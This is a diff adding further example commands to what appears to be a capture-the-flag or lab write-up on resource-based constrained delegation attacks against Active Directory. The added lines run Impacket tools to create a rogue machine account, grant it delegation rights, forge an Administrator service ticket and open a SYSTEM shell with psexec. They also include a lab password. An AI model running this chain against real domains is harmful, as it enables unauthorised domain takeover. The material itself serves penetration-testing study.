@@ -388,6 +388,19 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Successfully added machine account ATTACK$ with password AttackerPC1!.
 ```
 
+Another Example of this:
+```
+addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 
+$DomainController -domain-netbios $DOMAIN 'domain/user:password'
+
+python3 addcomputer.py -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] No DC host set and 'support' doesn't look like a FQDN. DNS resolution of short names will probably fail.
+[*] Successfully added machine account evilcom$ with password password.
+```
+
+
 We can verify that this machine account was added to the domain by using our `evil-winrm` session from before.
 
 ```
@@ -426,6 +439,12 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
 ```
 
+Another example of this:
+```
+./rbcd.py -f EVILCOM -t DC -dc-ip 10.10.11.174 support\\support:Ironside47pleasure40Watchful
+
+```
+
 We can confirm that this was successful by using our `evil-winrm` session.
 
 ```
@@ -450,11 +469,34 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Saving ticket in Administrator.ccache
 ```
 
+
+Another example of this:
+
+```
+python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support/EVILCOM$:password
+
+```
+
+Time Error
+```
+If you get this:
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+Do this:
+
+rdate -n $ip
+
+```
+
 This saved the ticket on our Kali host as **Administrator.ccache**. We need to export a new environment variable named `KRB5CCNAME` with the location of this file.
 
 ```
 ┌──(kali㉿kali)-[~]
 └─$ export KRB5CCNAME=./Administrator.ccache
+
+or this:
+
+export KRB5CCNAME=`pwd`/Administrator.ccache
 ```
 
 Now, all we have to do is add a new entry in **/etc/hosts** to point `resourcedc.resourced.local` to the target IP address and run `impacket-psexec` to drop us into a system shell.
@@ -483,3 +525,8 @@ nt authority\system
 C:\Windows\system32> 
 ```
 
+Another example of this:
+
+```
+python3 psexec.py -k DC.support.htb
+```
